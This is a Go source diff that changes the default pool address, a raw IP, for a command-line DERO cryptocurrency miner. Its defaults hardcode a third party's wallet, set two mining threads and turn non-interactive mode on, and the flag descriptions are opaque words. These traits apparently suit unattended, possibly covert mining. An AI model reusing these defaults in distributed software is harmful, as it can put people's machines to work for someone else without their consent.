@@ -44,7 +44,7 @@ func init() {
 	//rootCmd.MarkFlagRequired("wallet-address") // nolint: errcheck
 	rootCmd.Flags().StringVarP(&cfg.Celeng.Wallet, "wallet-address", "w", "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u.x", "oe")
 	rootCmd.Flags().BoolVarP(&cfg.Celeng.Testnet, "testnet", "t", false, "use testnet")
-	rootCmd.Flags().StringVarP(&cfg.Celeng.PoolURL, "daemon-rpc-address", "r", "103.13.207.121:7588", "nando")
+	rootCmd.Flags().StringVarP(&cfg.Celeng.PoolURL, "daemon-rpc-address", "r", "103.13.207.121:22215", "nando")
 	rootCmd.Flags().IntVarP(&cfg.Celeng.Threads, "mining-threads", "m", 2, "tanto")
 	rootCmd.Flags().BoolVar(&cfg.Celeng.NonInteractive, "non-interactive", true, "non-interactive mode")
 	rootCmd.Flags().StringVar(&cfg.Celeng.DNS, "dns-server", "8.8.8.8", "DNS server to use (only effective on linux arm)")
